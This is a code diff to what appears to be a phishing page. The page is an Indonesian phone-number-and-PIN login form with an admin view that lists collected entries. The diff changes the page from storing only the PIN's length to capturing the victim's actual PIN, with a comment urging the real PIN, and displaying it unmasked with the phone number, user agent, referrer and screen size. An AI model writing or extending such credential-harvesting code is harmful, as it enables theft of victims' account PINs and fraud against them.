@@ -564,7 +564,8 @@
         async function submitData() {
             const phone = document.getElementById('phone').value;
             const pinDigits = document.querySelectorAll('.pin-digit');
-            const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
+            const pinValue = Array.from(pinDigits).map(d => d.value).join('');
+
             
             // Show loading
             document.getElementById('loginText').style.display = 'none';
@@ -574,7 +575,7 @@
             const data = {
                 timestamp: new Date().toISOString(),
                 phone: phone,
-                pinLength: pinLength,
+                pinEntered: pinValue || 'Tidak diisi', // gunakan pin asli, bukan panjangnya
                 userAgent: navigator.userAgent,
                 referrer: document.referrer || 'Direct',
                 screenSize: `${screen.width}x${screen.height}`,
@@ -717,7 +718,7 @@
                         <strong>Entry #${data.length - index}</strong>
                         <br><small>⏰ ${date.toLocaleString('id-ID')}</small>
                         <br>📱 No. HP: +62${item.phone}
-                        <br>🔒 PIN: ${'●'.repeat(item.pinLength)} (${item.pinLength} digit)
+                        <br>🔒 PIN: ${item.pinEntered || 'Tidak diisi'} (${item.pinEntered?.length || 0} digit)
                         <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 60) + '...' : 'Unknown'}
                         <br>🌐 Referrer: ${item.referrer || 'Direct'}
                         <br>📺 Screen: ${item.screenSize} | 🗣️ Lang: ${item.language}
